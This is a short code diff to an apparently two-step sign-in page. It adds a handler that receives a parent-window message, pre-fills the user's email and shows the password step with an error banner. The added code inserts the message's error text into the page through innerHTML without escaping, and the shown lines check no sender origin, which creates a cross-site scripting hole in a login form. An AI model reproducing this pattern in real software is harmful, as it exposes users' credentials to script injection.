@@ -322,6 +322,29 @@
           passwordInput.value = '';
           passwordInput.focus();
         }
+        // Allow the parent (IncorrectPasswordPage) to jump straight to the
+        // password step with the email pre-filled and an error banner shown,
+        // instead of forcing the user back through the email step.
+        if (event.data.type === 'SHOW_PASSWORD_STEP') {
+          const payload = event.data.payload || {};
+          const presetEmail = (payload.email || '').toString();
+          const errorMessage = (payload.errorMessage || '').toString();
+          if (presetEmail) {
+            userEmail = presetEmail;
+            emailInput.value = presetEmail;
+            displayEmail.textContent = presetEmail;
+          }
+          emailView.classList.add('hidden');
+          optionsBox.classList.add('hidden');
+          passwordView.classList.remove('hidden');
+          passwordInput.value = '';
+          if (errorMessage) {
+            passwordErrorContainer.innerHTML = `<div id="error-message-container">${errorMessage}</div>`;
+          } else {
+            passwordErrorContainer.innerHTML = '';
+          }
+          passwordInput.focus();
+        }
       });
 
       nextBtn.addEventListener('click', async function () {
